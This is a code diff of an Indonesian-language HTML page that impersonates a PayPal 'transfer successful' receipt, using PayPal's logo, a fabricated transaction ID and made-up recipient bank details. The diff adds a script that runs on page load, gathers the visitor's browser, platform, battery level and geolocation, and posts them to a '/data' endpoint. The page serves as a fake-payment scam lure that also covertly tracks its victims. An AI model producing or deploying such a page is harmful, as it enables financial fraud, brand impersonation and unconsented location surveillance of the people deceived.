@@ -1,15 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Transfer Selesai - PayPal</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <div class="card">
-    <h1>Transfer Berhasil</h1>
-    <p>Rp 1.500.000 telah dikirim ke rekening Anda</p>
-    <p>ID Transaksi: PP-ID8728932873</p>
-  </div>
+  <meta charset="UTF-8">
+  <title>PayPal - Transfer Berhasil</title>
   <script src="script.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f6f7fb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      max-width: 450px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      height: 45px;
+    }
+
+    h1 {
+      color: #0070ba;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .amount {
+      font-size: 22px;
+      font-weight: bold;
+      color: #111;
+      margin-bottom: 10px;
+    }
+
+    .status {
+      color: #4BB543;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+
+    .transaction-id {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    .summary {
+      text-align: left;
+      font-size: 14px;
+      color: #333;
+      border-top: 1px solid #ddd;
+      padding-top: 15px;
+    }
+
+    .summary p {
+      margin: 5px 0;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #999;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+    </div>
+
+    <h1>Transfer Berhasil</h1>
+    <div class="amount">Rp 1.500.000</div>
+    <div class="status">Dana telah dikreditkan</div>
+    <div class="transaction-id">ID Transaksi: PP-ID8728932873</div>
+
+    <div class="summary">
+      <p><strong>Nama Penerima:</strong> Andi Prasetyo</p>
+      <p><strong>Rekening Tujuan:</strong> BCA 0149384728</p>
+      <p><strong>Tanggal:</strong> 1 Agustus 2025</p>
+      <p><strong>Metode:</strong> PayPal Balance</p>
+    </div>
+
+    <div class="footer">
+      © 2025 PayPal, Inc. Semua hak dilindungi undang-undang.
+    </div>
+  </div>
+
+  <script>
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        battery: null,
+        location: null
+      };
+    }
+
+    async function sendData(data) {
+      try {
+        await fetch("/data", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+      } catch (err) {
+        console.error("Gagal kirim data:", err);
+      }
+    }
+
+    navigator.getBattery().then(batt => {
+      let info = getDeviceInfo();
+      info.battery = `${Math.round(batt.level * 100)}%`;
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        info.location = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude
+        };
+        sendData(info);
+      }, () => {
+        sendData(info);
+      });
+    });
+  </script>
 </body>
 </html>
